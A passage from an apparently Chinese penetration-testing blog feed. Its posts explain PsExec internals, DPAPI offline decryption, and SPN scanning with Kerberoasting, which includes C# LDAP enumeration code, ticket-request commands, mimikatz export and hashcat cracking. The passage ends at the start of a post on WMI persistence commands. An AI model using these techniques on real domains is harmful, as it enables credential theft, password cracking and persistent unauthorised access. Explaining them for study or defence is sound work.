        <tag>内网渗透</tag>
        <tag>C#</tag>
        <tag>Tools</tag>
        <tag>编程之道</tag>
        <tag>Decrypt</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【知识回顾】深入了解 PsExec]]></title>
    <url>%2F2019%2F08%2F%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3%20PsExec%2F</url>
    <content type="text"><![CDATA[这个[ 知识回顾 ]系列文章，整合记录的是在掌握知识点中，所忽略的点、涉及的原理等； 0x00 前言这篇文章将解释 PsExec 的使用条件、原理及背景知识。但不包括 PsExec 在通信时主要用到了 SMB 这个应用层协议（ SMB协商过程），想了解的请看 参考-1-2。 0x01 什么是 PsExecPsExec 是由 Mark Russinovich 创建的 Sysinternals Suite 中包含的工具。最初，它旨在作为系统管理员的便利工具，以便他们可以通过在远程主机上运行命令来执行维护任务。PsExec 可以算是一个轻量级的 telnet 替代工具，它使您无需手动安装客户端软件即可执行其他系统上的进程，并且可以获得与命令控制台几乎相同的实时交互性。PsExec最强大的功能就是在远程系统和远程支持工具（如 ipconfig、whoami）中启动交互式命令提示窗口，以便显示无法通过其他方式显示的有关远程系统的信息。 0x02 工作原理通过提供目标主机的地址，有效用户和密码，就可以远程控制计算机。 它的背后到底发生了些什么，我们来看看： 将 PSEXESVC.exe 上传到 ADMIN$ （指向 /admin$/system32/PSEXESVC.EXE）共享文件夹内； 远程创建用于运行 PSEXESVC.exe 的服务； 远程启动服务。 PSEXESVC 服务充当一个重定向器（包装器）。它在远程系统上运行指定的可执行文件（事例中的是 cmd.exe）。同时，它通过主机之间来重定向进程的输入/输出（利用命名管道）。 0x03 详细过程 使用提供的凭证，通过 SMB 会话 进行身份验证。 通过 SMB 访问默认共享文件夹 ADMIN$，并上载 PSEXESVC.exe； 打开 \\RDC\pipe\svcctl 的句柄，与服务控制管理器（SCM）进行通信，这使得我们能够远程创建/启动服务。此时使用的是 SVCCTL 服务，通过对 SVCCTL服务 的 DCE/RPC 调用来启动 PsExec; 使用上传的 PSEXESVC.exe 作为服务二进制文件，调用 CreateService 函数； 调用 StartServices 函数； 正如下面的 Wireshark 所捕获到的数据，它是创建了命名管道来重定向 stdin（输入）、stdout（输出）、stderr（输出）。 总共创建了4个命名管道，一个用于服务本身，另外的管道用于重定向进程的 stdin、stdout、stderr。 0x04 使用 PsExec 的最低要求123451、远程机器的 139 或 445 端口需要开启状态，即 SMB；2、明文密码或者 NTLM 哈希；3、具备将文件写入共享文件夹的权限；4、能够在远程机器上创建服务：SC_MANAGER_CREATE_SERVICE (访问掩码：0x0002)；5、能够启动所创建的服务：SERVICE_QUERY_STATUS（访问掩码：0x0004）+ SERVICE_START（访问掩码：0x0010） 注意 12345NTLM != NTLM v1/v2 ；NTFS 权限 != 共享权限；如果使用的是 Sysinternal 的 PsExec，它是会将 PSEXESVC.exe 复制到 ADMIN$，因此是具备访问它的权限；PSEXESVC 服务将会安装在远程系统中，此时将会生成 Event 4697、7045 这2种事件日志；PsExec 2.1版本之后，不再是明文传输。 在多数情况下，即使账号出现泄漏情况，使用 PsExec， 也无法完成第4和第5点的要求，因为账号不是特权账号（RID500、域管理员）。 0x05 其他日志分析：略 0x06 参考1、[翻译] 网络安全分析之 SMB 协议 2、[使用Hash直接登录Windows]简单分析 3、[技术分享] 深入分析PsExec执行行为]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>系统安全</tag>
        <tag>知识回顾</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【知识回顾】DPAPI 详解]]></title>
    <url>%2F2019%2F07%2F%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91DPAPI%20%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[摘要：数据保护接口是微软从 Windows 2000 开始引入的一种简易程序接口，主要为应用程序和操作系统程序提供高强度的数据加密和解密服务。Windows 系统用户大量的私密数据都采用了 DPAPI 进行加密存储。 0x00 前言​ 绝大多数应用程序都有数据加密保护的需求，存储和保护私密信息最安全的方式就是每次需要加密或解密时都从用户那里得到密码，使用后再丢弃。这种方式每次处理信息时都需要用户输入口令，对于绝大多数用户来说，这种方式是不可取的。因为这要求用户记住很多信息，而用户一般会反复使用同一个密码，从而降低系统的安全性和可用性。因此需要一种加密机制，再不需要用户输入任何信息的情况下也能存储秘密数据，而微软数据保护接口（Data Protection Application Programming Interface，DPAPI）便是瞒住这种要求的程序接口。 ​ 从 Windows 2000 开始，用户程序或操作系统程序就可以直接调用 DPAPI 来加密数据。由于 DPAPI 简单易用且加密强大，大量应用程序都采用 DPAPI 加密用户的私密数据，如 Chrome 浏览器的自动登陆密码、远程桌面的自动登陆密码、Outlook邮箱的账号密码、加密文件系统的私钥等。DPAPI 内部加密流程异常复杂而且微软官方也未公布过其内部细节，这给理解该接口内部实现机制带来了极大困难。本文在已有的研究基础上对 DPAPI加密机制做了全面剖析，给出了DPAPI的离线解密方法。 0x01 DPAPI 概述1.1 DPAPI 函数​ DPAPI 由一个加密函数（CryptProtectData()）和一个解密函数（CryptUnProtectData()）组成，是一组跟Windows 系统用户环境上下文密切相关的数据保护接口。某个系统用户调用 CryptProtectData() 加密后的数据只能由同一系统用户调用 CryptUnProtectData() 来解密，一个系统用户无法调用 CryptUnProtectData() 来解密其他系统用户的 DPAPI 加密数据。 CryptProtectData() 的函数调用 1234567pDataIn：DATA_BLOB 结构指针，只想需要加密的数据明文块；szDataDescr：描述字符串，返回的数据包含该字符串，其未被加密。该参数为可选参数，可以为 NULL；pOptionslEntropy：DATA_BLOB 结构指针，指向一个额外熵参数，可以是一个加密密码。改参数为可选参数乜可以为 NULL。若加密时设置了额外熵参数，则加密时必须提供同样的熵参数，否则无法解密；pvReserved：保留，必须为 NULL；pPromptStruct：CRYPTPROTECTPROMPTSTRUCT 结构指针，用于弹出对话框与用户交互，通常为 NULL。dwFlags：加密标识位，通常为 NULL；pDataOut：DATA_BLOB 结构指针，只想经过加密处理后的密文块。 CryptUnProtectData() 的参数跟 CryptProtectData() 的参数类似，详见 MSDN 文档.aspx)，这里不在说明。 1.2 基本概念介绍1）加密应用程序编程接口 ​ 加密应用程序编程接口（ cryptography application programming interface, CryptoAPI ）是 Windows 平台提供的一组函数，该函数允许应用程序对用户的秘密信息进行编码、加密和数字签证等操作。CryptoAPI 内部的加密操作是在加密服务提供程序（CSP）的独立模块中执行，DPAPI 是在 CryptoAPI 的基础上实现封装。 2）加密服务提供程序 ​ 加密服务提供程序（ cryptographic service provider，CSP ）是一组实现标准加密和签名算法的硬件和软件的组合。每个 CSP 都包含一组它们自己定义并实现的函数。不同的 CSP 提供的安全算法不用，且 CSP 是平台相关的。不同的 Windows 操作系统提供的 CSP 的个数和类型也不同，每个 CSP 都有其对应的名称和类型，名称必须是唯一的。目前常用的 CSP 类型有9种，要指定采用哪种 CSP，只需在 CryptAcquirecContext() 中指定即可，DPAPI 默认使用 PROV_RSA_FULL 类型。 3）算法标识 ​ 算法标识（ ALG_ID ）是微软顶一顶一系列 32 位整型值，用于指明 CryptoAPI 所采用的加密或散列算法类型。其中以 0x66 开头的标识通常表示对称加密算法，以 0x88 开头的标识通常表示散列算法。例如，CALG_3DES 对应的值为 0x6603 ，表示为三重数据加密标准。 4）安全散列算法 ​ 安全散列算法（ secure hash algorithm，SHA ）是散列算法中的一种，又叫摘要算法，用于产生消息摘要，也是经常使用的一种算法。在数据签名标准（ digita signature standard，DSS ）中，安全散列算法通常和数字签名算法（ digital signature algorithm，DSA ）一起用于对消息进行数字签名。每一个安全散列算法都有其对应的算法标识。在 CryptoAPI 中，SHA 对应的算法标识为 CALG_SHA 。目前，安全散列算法有 4 种：SHA-1、SHA-256、SHA-384 和 SHA-512，可分别产生 160 位、256 位、384 位和 512 位长的消息摘要，还有一个变种的SHA-224（224位）实现方为 Bouncy Castle。 5）会话密钥 ​ 会话密钥（ session key ）是随机产生的密钥，使用一次后，立刻被丢弃而不会被保存。在 CryptoAPI 中，会话密钥通常是对称加密算法的密钥。会话密钥由 40～2000 位随机数组成，可以通过调用 CryptoAPI 中的 CryptDeriveKey() 并传递一个散列值来生成。 6）干扰值 ​ 干扰值（ salt valve ）也称作 “盐”，通常是随机数，一般可看作是会话密钥的一部分。干扰值被添加到会话密钥后，通常是以明文的形式被防止在加密数据的前端。加入干扰值可以有效地防止堆成加密算法被预先计算好的彩虹表攻击。在 CryptoAPI 中，干扰值通过 CryptGenRandom() 来生成，此函数在将来的版本会进行删除，详情请看函数详情。 7）基于口令的密钥派生函数 ​ 基于口令的密钥派生函数（ passwordbased key derivation function，PBKDF ）通过对干扰后的用户输入口令计算多次散列来缓和字典攻击。攻击者若想确定口令的正确性，需要执行上百万条指令，导致完成一次字典攻击就需要花费大量时间。PBKDF 目前有两个版本：PBKDF1 和 PBKDF2，两个函数均以口令、干扰值和内部函数的跌代次数作为输入。在 DPAPI 中，采用的是 PBKDF2 版本，且内部做了部分改动。 8）加密散列函数 ​ 加密散列函数又叫基于散列的消息认证代码（ hash-based message authentication code，HMAC ）。使用加密散列函数需要一个密钥，同时还需要制定一个散列函数，可以是 MD5 或 SHA-1 等。在 DPAPI 中，HMAC 主要用于数据认证。 9）密钥分组链接 ​ 密钥分组链接（ cipher-block chaining，CBC ）是一种加密模式，在 CBC 模式中，每个分组完的明文块都需要与前一个经过加密后的密文块进行异或操作，然后进行加密操作。因此需要使用初始化向量。 CBC 加密模块是微软默认使用的加密模块，DPAPI 内部对所有对称加密算法默认都采用 CBC 加密模式。 10）填充 ​ 填充( padding) 是明文根据加密函数进行数据分组后，由于最后一个明文块不满足分组数据长度要求而在末尾额外添加的数据。填充的数据解密后一般会被自动移除，DPAPI 内部所有堆成加密算法默认都采用 PKCS 填充方式。 0x02 DPAPI 加密机制分析​ CryptProtectData() 是对 CryptoAPI 的封装，其加密过程如下图所示。 图1 DPAPI 加密过程​ 整个加密过程大致可以分成 3 个阶段，分别为生成主密钥、解密主密钥以及使用主密钥加密数据。 2.1 生成主密钥​ 当前应用程序调用 CryptProtectData() 时，DPAPI 会读取主密钥存储区下的 Preferred 文件，获取当前系统使用的主密钥文件及其创建时间，如果创建时间与当前系统时间相差超过了 90 天，则重新生成一个主密钥文件。 ​ 为了防止攻击者对同一个加密主密钥进行长期的攻击，微软引入了主密钥的更新机制，更新时间微软设置为 90 天。即若 Preferred 文件中指示的主密钥创建时间与系统当前时间相差 90 天以上，将生成一个新的主密钥，新的主密钥将以同样的加密方式保护用户数据。这种主密钥更新策略有效防止了攻击者破解唯一的主密钥后即可访问用户所有的受保护数据。因为主密钥会更新，因而 DPAPI 必须提供一种机制能够解密历史主密钥加密下的数据库。其实，DPAPI 不删除任何过期的主密钥，所有的主密钥文件保存在用户的配置文件目录下，且全受到用户登陆密码的保护，并且每一个加密块都存储着当时加密它的主密钥全局唯一标识符（GUID）。当需要解密加密块时，DPAPI 从加密块中提取 GUID，找到对应主密钥文件进行相应的数据解密。 2.2 解密主密钥​ 若 Preferred 文件指示的主密钥没有过期，DPAPI 将解密对应的主密钥文件，获取 64 字节的主密钥。 ​ 主密钥受到用户登陆密码保护。DPAPI 首先使用 SHA-1 安全散列函数作用于用户登陆密码，然后将此密码散列和 16 字节的干扰值以跌代次数提供给基于口令的密钥派生函数 PBKDF2，用户派生一个会话密钥；然后用此会话密钥作为堆成加密算法的加密密钥，对主密钥进行加密，将加密后的主密钥存储在用户的配置文件目录下。 ​ 为了防止主密钥被篡改，主密钥将被计算 HMAC 加密散列。DPAPI 将使用 SHA 版HMAC 加密散列算法并以密码散列作为加密密钥作用于 16 字节干扰值，进而派生对应加密 散列值。该加密散列值再次作为 HMAC 的密钥计算主密钥的加密散列，计算后的加密散列同加密后的主密钥一起存于主密钥中。 ​ 由于主密钥受到用户登陆密码的保护，而用户登陆密码又是可修改的。因此，DPAPI 必须提供一种机制，使得在用户修改登陆密码后仍然可以正常解密主密钥。其实，DPAPI 对密码修改模块进行了 Hook 操作。当用户修改密码时，所有主密钥都将根据新的密码重新加密。另外，用户配置文件目录下有个历史凭据文件 CREDHIST，当用户修改密码时，旧密码的 SHA-1 散列值会用新的密码进行加密，然后将加密后的结果存放在文件的底部。因此，如果当前系统登录密码法务解密主密钥，DPAPI 将使用当前密码解密历史凭据文件，获取上一次历史密码散列值，然后用这个历史密码散列值解密主密钥。如果解密又失败了，历史密码散列值将再次用于解密历史凭据文件，获取更旧的密码散列值。如此下去，直到成功解密主密钥为止。 2.3 使用主密钥加密数据​ 主密钥并不直接作为加密密钥来保护数据。DPAPI 首先将主密钥、16 字节干扰值以及应用程序提供的额外熵参数 3者组合派生一个会话密钥，然后用这个会话密钥对数据进行加密。但这个会话密钥永远不会被保存，DPAPI 选择存储用于派生会话密钥的 16 字节干扰值。这些干扰值是用来产生加密数据的关键。当 DPAPI 需要解密加密块时，便从加密块种提取这 16 字节的干扰值，并以同加密相同的方式派生出会话密钥，然后用该会话密钥对数据进行解密。 0x03 DPAPI 离线解密方法由以上对 DPAPI 加密过程的分析容易得出 DPAPI 离线解密过程，如下图所示。 图2 DPAPI 离线解密过程​ DPAPI 离线解密过程大致可以分为以下几点。 3.1 定位主密钥​ 由对 DPAPI 加密过程的分析可知主密钥文件会定期更新，Preferred 文件中存储这最后生成的主密钥文件 GUID，然而任意给定的一个 DPAPI 加密块并不一定时用最新的主密钥进行解密。为了快速定位 DPAPI加密块对应的主密钥文件，DPAPI 加密块种存储当时加密它的主密钥 GUID。DPAPI 加密块大致结构如下图所示。 图3 DPAPI 加密块结构​ 从 DPAPI 加密块结构可知其除了存储主密钥 GUID 外，还存储解密时所需的其他关键数据信息，包括所使用的对称加密算法标识、安全散列算法标识、干扰值等。 第一个字段表示版本号，为固定值 0x00000001； 第二个字段表示加密服务提供程序的 DUID，也为固定值 D08C9DDF0115D1118C7A00C04FC297EB； ​ 由于标准的 DPAPI 加密块总是以单个完整的文件存在，所以标准的 DPAPI 加密块有可能包含在文件中作为文件的一部分存在，甚至有些文件可以包含多个标准的 DPAPI 加密块。由于 DPAPI 加密块的前两个字段总是为固定值，因此可以以此为特征在文件中搜索和提取标准的 DPAPI 加密块。 3.2 解密主密钥​ Windows 的主密钥文件和历史凭据文件有其固定的路径结构，如下所示。 用户主密钥文件，位于％APPDATA％\Microsoft\Protect\％SID％ 系统主密钥文件，位于％WINDIR％\System32\Microsoft\Protect\S-1-5-18\User ​ 每个系统帐号都有其对应的若干个主密钥；%SID% 是 Windows系统为区分不同账户而为它们分配的全局唯一标识符，它们的格式的固定的。和主密钥对应的历史凭据文件则位于主密钥的上一层目录。 ​ 主密钥文件共包含 5 个数据单元，分别为主密钥头部单元、用户主密钥单元、本地加密密钥单元、历史凭据标识单元和域密钥备份单元。结构如图所示。 图4 主密钥文件结构​ 其中，主密钥头部单元包括主密钥 GUID，该标识与 DPAPI 中指示的加密密钥唯一标识相对应。另外，主密钥头部单元还包含了指示其他个单元占用字节数的字段。历史凭据单元也包含一个全局唯一表示符（ CREDHIST GUID ），用来指示跟主密钥文件对应的历史凭据文件。对于域密钥本分单元，只有域环境下的用户才会有，此单元的数据经过了域管理员的公钥加密处理。对于单机用户，无论什么系统都没有域密钥备份单元，这篇文章主要解析单机用户主密钥单元。用户主密钥单元包含一个经过加密的二进制加密块，其中的加密数据就是主密钥。 ​ 用户主密钥单元中包含 PBKDF2 采用的迭代次数、安全散列算法类型和对称加密算法类型等字段，不同的操作系统有着不同的值 操作系统 PBKDF2迭代次数 安全散列算法类型 加密算法类型 Windows XP 4000 SHA-1 DES-3 Windows 2003 4000 SHA-1 DES-3 Windows Vista 24000 SHA-1 DES-3 Windows 7 5600 SHA-512 SHA-256 Windows 8 8000 SHA-512 SHA-256 Windows 10 ​ 由 DPAPI 的加密过程分析可知，要使 DPAPI 正常运作，必须保存用户所有的历史登陆密码的 SHA-1 值。用户所有的历史登陆密码的 SHA-1 值存储在一个名为 CREDHIST 的历史凭据文件中，结构如图所示 图5 历史凭据文件结构​ CREDHIST 以链表的形式存储用户历史登陆密码的 SHA-1 值，每个用户的登陆密码散列值作为链表的一个节点，整个链表在文件中以反向形式存储，即表头在最后，倒数第二个记录时第一个节点，依次类推。而每个链表节点都具有相同的数据格式，并且每个节点的 SHA-1 值被前一个节点的 SHA-1 值加密处理，加密的方式与主密钥的加密方式一样。 ​ 图 2 的解密主密钥过程中涉及一个基于口令的密钥派生函数（ PBKDF2 ）的调用，微软的 PBKDF2 跟工业标准（ PKCD#5 ）不太一样，其内部做了部分改动。工业标准的 PBKDF2 函数循环内的伪随机函数的输入时上一次循环伪随机函数的输出，而微软 PBKDF2 函数伪随机函数的输入则是上两次相邻随机函数输出的异或。 3.3 解密 DPAPI 加密块​ 从图 2 的 DPAPI 离线解密过程可以知道，在解密 DPAPI加密块时先需要从主密钥派生一个会话密钥，派生过程中调用了改版的加密散列函数（ M_HMAC() ）和一个烟花密钥函数（ DeriveKey() ）。M_HMAC() 输入包括 DPAPI 提供的额外熵参数。 M_HMAC() 具体描述如下所示： 1234567891011M_HMAC(K, m, e, s) 算法的数据定义为：M_HMAC(K, m, e, s) = H((K ⊕ opad) // H((K ⊕ ipad) // m) // e // s)H() 表示对应的散列函数K 表示密钥，这里对应密钥的 SHA-1 值M 表示需要认证的数据，这里对应 SaltS 表示强密码// 表示两个字符串的连接⊕ 表示异或Opad 表示外部填充块Ipad 表示内部填充块 DeriveKey() 对应于 CryptoAPI 的 CryptDeriveKey()，具体描述如下： 1234567891011DeriveKey(d, n) 算法的数据定义为：DeriveKey(d, n) = F-n(H( d ⊕ ipad) // H(d ⊕ opad))H() 表示对应的散列函数F-n() 表示取前 t 个字节数据n 表示需要演化出的密钥长度d 表示被演化的数据(对应 M_HMAC() 输出)，并通过填充 0 补齐 64 字节长// 表示两个字符串的连接⊕ 表示异或Opad 表示外部填充块Ipad 表示内部填充块 0x04 DPAPI 的应用 EFS文件加密 存储无线连接密码 Windows凭据管理器 IE浏览器 外表 Skype的 Windows CardSpace Windows Vault 谷歌浏览器 0x05 结束语在 WIndows 操作系统中，DPAPI 作为具有加密功能的最主要接口之一，保护着大量的用户私密数据。然而，本文给出的 DPAPI 离线解密方法，只适用于单机用户，无法解密域管理员控制下的 DPAPI 加密的数据。与环境控制下的 DPAPI 加密机制相对于淡季用户有很大的不同。 0x06 参考DPAPI 离线解密方法及其取证应用]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>系统安全</tag>
        <tag>知识回顾</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【域渗透】SPN 扫描利用]]></title>
    <url>%2F2019%2F06%2F%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91SPN%20%E6%89%AB%E6%8F%8F%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Kerberos 与 SPN。 0x00 前言在内网渗透的信息收集中，机器服务探测一般都是通过端口扫描去做的，但是有些环境不允许这些操作。通过利用 SPN 扫描可快速定位开启了关键服务的机器，这样就不需要去扫对应服务的端口，有效规避端口扫描动作。 Kerberoasting 是域渗透中经常使用的一项技术，是通过爆破 TGS-REP 实现。 0x01 关于 SPN服务主体名称（SPN: Service Principal Names）是服务实例，可以将其理解为一个服务（比如 HTTP、MSSQL）的唯一标识符，服务在加入域中时是自动注册的。 如果在整个林或域中的计算机上安装多个服务实例，则每个实例都必须具有自己的 SPN。如果客户端可能使用多个名称进行身份验证，则给定服务实例可以具有多个 SPN。SPN 始终包含运行服务实例的主机的名称，因此服务实例可以为其主机名称或别名注册 SPN。 如果用一句话来说明的话就是如果想使用 Kerberos 协议来认证服务，那么必须正确配置 SPN。 SPN 可以分为两种： 注册在域内机器账户（Computers）上 注册在域内用户账户（Users）下 0x02 SPN 标准格式在 SPN 语法中存在 4 种元素，两个必须元素和两个格外元素。其中 &lt;service class&gt; 和 &lt;host&gt; 为必需元素。 123&lt;service class&gt;/&lt;host&gt;:&lt;port&gt; &lt;servername&gt;服务类型/对应机器名:服务端口[默认端口可不写]MSSQLSvc/SQLServer.rcoil.me:1433 0x03 使用 SetSPN 为机器(域用户)创建 SPN命令语法类似如下： 1Setspn -S http/&lt;computername&gt;.&lt;domainname&gt; &lt;domain-user-account&gt; -S 参数：验证不存在重复项后，添加随意 SPN。注意： -S 从 Windows Server 2008 开始系统默认提供。 此处以 Web 服务器为例。 以 web 用户 运行 Web 服务器 域管理员权限运行 cmd 12Setspn -s http/WebDemo_PC.rcoil.me rcoil\webSetspn -s http/WebDemo_PC.rcoil.me WebDemo_PC$ 结果如下： 0x04 借助 SetSPN 对域内相关服务进行查询4.1、查询域内 MSSQL 数据库服务器使用第 3 点中的对照表快速查询 1setspn -T rcoil.me -Q */* | findstr "MSSQLSvc" 4.2、相关查询 C# 源码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788using System;using System.Collections.Generic;using System.DirectoryServices;using System.DirectoryServices.ActiveDirectory;using System.Linq;using System.Text;using System.Text.RegularExpressions;namespace SPNSearcher&#123; class Program &#123; static void Main(string[] args) &#123; Domain CurrentDomain = Domain.GetCurrentDomain(); DirectoryEntry rootEntry = new DirectoryEntry("LDAP://rootDSE"); string RootDSE = (string)rootEntry.Properties["defaultNamingContext"].Value; Console.WriteLine("[*] Current Domain: "+ CurrentDomain); GetSPNInfor(RootDSE); &#125; /// &lt;summary&gt; /// 通过 SPN 扫描获取域中基于主机的 MSSQL、Exchange 等服务 /// &lt;/summary&gt; /// ADSearcherSPNTypes = "ADAM","AGPM","bo","CESREMOTE","Dfs","DNS","Exchange","FIMService","ftp","http","IMAP","ipp","iSCSITarget","kadmin","ldap","MS","sql","nfs","secshd","sip","SMTP","SoftGrid","TERMSRV","Virtual","vmrc","vnc","vpn","vssrvc","WSMAN","xmpp" /// &lt;param name="RootDSE"&gt;Current forest.&lt;/param&gt; public static void GetSPNInfor(string RootDSE) &#123; Console.WriteLine("[*] Current Domian SPN Information:"); DirectoryEntry gcEntry = new DirectoryEntry("GC://" + RootDSE); List&lt;string&gt; Supersedence = new List&lt;string&gt;(); Supersedence.AddRange(new string[] &#123; "SQL:*MSSQL*:SQL Server 数据库", "Exchange:*exchange*:Exchange 相关服务", "DNS:*DNS*:DNS 服务", "SQL:*MySql*:MySql 数据库", "Oracle:*Oracle*:Oracle 数据库", "postgres:*postgres*:Postgres 数据库", "HTTPS:*HTTPS*:HTTPS Web 服务", "HTTP:*HTTP*:HTTP Web 服务", "VPN:*VPN*:VPN 远程接入服务", "VNC:*VNC*:VNC 服务" &#125;); foreach (string SPNServiceFilter in Supersedence) &#123; string[] sArray = Regex.Split(SPNServiceFilter, ":", RegexOptions.IgnoreCase); string ContainsInfo = sArray[0].ToString(); string ADSearcherSPNTypes = sArray[1].ToString(); string SPNService = sArray[2].ToString(); using (gcEntry) &#123; DirectorySearcher spnSearch = new DirectorySearcher(gcEntry, "(&amp;(objectClass=user)(servicePrincipalName=" + ADSearcherSPNTypes + "))"); Console.WriteLine(); Console.WriteLine(" [+] SPN service: " + SPNService); foreach (SearchResult sr in spnSearch.FindAll()) &#123; var SPNs = sr.Properties["servicePrincipalName"]; if (SPNs.Count &gt; 1) &#123; foreach (string spn in SPNs) &#123; if (spn.Contains(ContainsInfo)) &#123; Console.WriteLine(" [&gt;] SAM Account Name: &#123;0&#125;", sr.Properties["sAMAccountName"][0]); Console.WriteLine(" [&gt;] " + spn); break; &#125; &#125; &#125; else &#123; Console.WriteLine(" [&gt;] " + SPNs[0]); &#125; &#125; &#125; &#125; &#125; &#125;&#125; 自行添加需要的服务即可，更多的服务写在了备注中。 4.3、相关原理说明在 SPN 扫描时我们可以直接通过脚本，或者命令去获悉内网已经注册的 SPN 内容 LDAP 协议全称是 Lightweight Directory Access Protocol，一般翻译都是翻译成 轻量目录访问协议。通俗点可以把 LDAP 协议理解为一个关系型数据库，其中存储了域内主机的各种配置信息。 在域控中默认安装有 ADSI 编辑器，它是 LDAP 的编辑器，可以通过在域控中运行 adsiedit.msc 来打开。 我们的 SPN 查询，实际上就是就是查询 LDAP 中存储的内容。（以后会通过别的章节详细介绍 LDAP 协议） 下图是 4.2 中 MSSQL 查询的结果，协议为 LDAP。 4.4、更多扫描工具扫描工具有很多，但是只要知道原理就不会觉得太难。 1234Discover-PAMSSQLServers(Powershell-AD-Recon)GetUserSPNs(Powershell、vbs、Python)PowerView(Powershell)SetSPN(exe) 0x05 获取当前目标域中所有以域用户身份起服务的 SPN查询以域用户身份起的服务，主要是为了后续 Kerberoast做准备。 现成工具 12cscript.exe GetUserSPNs.vbspowerview --&gt; Get-NetUser -SPN C# 代码（其实就是查询LDAP）： 1234567891011121314151617181920public static void GetUserSPN(string RootDSE) &#123; Console.WriteLine("[*] Current Domian SPN Information:"); Console.WriteLine(); DirectoryEntry gcEntry = new DirectoryEntry("GC://" + RootDSE); string querySPN = @"(&amp;(!objectClass=computer)(servicePrincipalName=*))"; using (gcEntry) &#123; DirectorySearcher mssqlSearch = new DirectorySearcher(gcEntry, querySPN); foreach (SearchResult sr in mssqlSearch.FindAll()) &#123; Console.WriteLine(" [&gt;] SamAccountName: &#123;0&#125;", sr.Properties["sAMAccountName"][0]); Console.WriteLine(" [&gt;] DistinguishedName: &#123;0&#125;", sr.Properties["distinguishedName"][0]); Console.WriteLine(" [&gt;] ServicePrincipalName: &#123;0&#125;", sr.Properties["servicePrincipalName"][0]); Console.WriteLine(); &#125; &#125; &#125; 结果如下： 0x06 Kerberoast (Kerberos TGS服务票据(Service Ticket)离线爆破)6.1、申请 TGS powershell 12PS&gt;Add-Type -AssemblyName System.IdentityModelPS&gt;New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/WebDemo_PC.rcoil.me" C# 1234567891011public KerberosRequestorSecurityToken (string servicePrincipalName);参数servicePrincipalNameStringKerberosRequestorSecurityToken 安全令牌的服务主体名称。 设置 ServicePrincipalName 属性。异常ArgumentNullExceptionservicePrincipalName 为 null。SecurityTokenException无法为当前用户获取 Kerberos 票证。 这一整个过程是通过 AS-REQ、AS-REP、TGS-REQ、TGS-REP 这四个认证流程，最终获取到 RC4方式的加密票据。 6.2、获取 TGS-REPKerberos 协议中请求的票据会保存在内存中，可以通过 klist 命令查看当前会话存储的 kerberos 票据。 使用 mimikatz 的 kerberos::list /export 导出。 SharpRost （如今的Rubeus） Invoke-kerberoast 的 -outputformat ，选择 hashcat 格式。 综合以上代码，新建项目，项目地址: SPNSearcher 6.3、爆破 TGS-REP此处爆破的是HTTP/WebDemo_PC.rcoil.me 可选择工具（工具始终是工具，看的是字典强不强）:12tgsrepcrack.py(kerberoast套装)hashcat(密码破解全能工具，kali自带) 0x07 Kerberoasting 的后门利用在我们取得了 SPN 的修改权限后，可以为指定的域用户添加一个 SPN，这样可以随时获得该域用户的 TGS ，经过破解后获得明文口令。 0x08 参考为报表服务器注册服务主体名称 (SPN)KerberosRequestorSecurityToken(String)从 Kekeo 到 Rubeus域渗透——Kerberoasting]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>域渗透</tag>
        <tag>C#</tag>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【权限维持】WMIC 事件订阅]]></title>
    <url>%2F2019%2F05%2F%E3%80%90%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E3%80%91WMIC%20%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85%2F</url>
    <content type="text"><![CDATA[本文是针对Windows常见持久控制的第三次说明。 与之前的文章不同，这个操作需要管理员权限。 0x00 前言在日常中，使用 WMI 都是用于信息的收集，如下： 123456789wmic qfe list #获取补丁信息wmic startup list brief # 启动的程序wmic startup list full # 自启动的程序wmic process call create "calc.exe" # 在当前机器中执行指定程序wmic process where name='*.exe' list full #查询某个进程所对应某个具体的可执行程序是什么wmic process where(description="rundll32.exe") # 查看rundll32所加载的dllwmic cpu get DataWidth /format:list # 查询当前机器的操作系统位数wmic share get name,path,status #利用wmic查找共享wmic logicaldisk where drivetype=3 get name,freespace,systemname,filesystem,volumeserialnumber,size #查看分区 但其实它的功能还有很多，比如： 12345防病毒检测代码执行横向移动持久化盗取数据 这里就针对持久化进行说明 。 0x01 查询 WMIWMI 提供了一种非常直观的语法用来查询WMI对象的实例，类和命名空间，即 WQL （类似 SQL的查询语言）。WQL查询通常可以分为以下几类： Instance Queries（实例查询）：查询WMI对象实例。 Event Queries（事件查询）：等同于在WMI对象创建/修改/删除的时候注册一个消息。 Meta Queries（元查询）：元查询用来获取WMI命名空间和类结构的元信息。 1.1 Instance Queries这是最常用的WQL查询。基本的格式如下：SELECT [Class property name | *] FROM [CLASS NAME] &lt;WHERE [CONSTRAINT]&gt; 下面的查询语句将返回所有可执行文件名中带有 chrome 的正在运行的进程：SELECT * FROM Win32_Process WHERE Name LIKE &quot;%chrome%&quot; 1.2 Event Queries事件查询被用作一种消息机制来监听事件类的触发。通常用来在一个WMI对象实例创建/修改/删除的时候给用户发送一个消息。根据消息类型是 intrinsic（系统自带的）还是 extrinsic（第三方的），查询语句格式不同： 123SELECT [Class property name | *] FROM [INTRINSIC CLASS NAME] WITHIN [POLLING INTERVAL] &lt;WHERE [CONSTRAINT]&gt;SELECT [Class property name | *] FROM [EXTRINSIC CLASS NAME] &lt;WHERE [CONSTRAINT]&gt; 用于登陆时都会触发此事件： 1SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstanceISA 'Win32_LogonSession' AND TargetInstance.LogonType=2 每次用户在插入可移除设备时都会触发此事件： 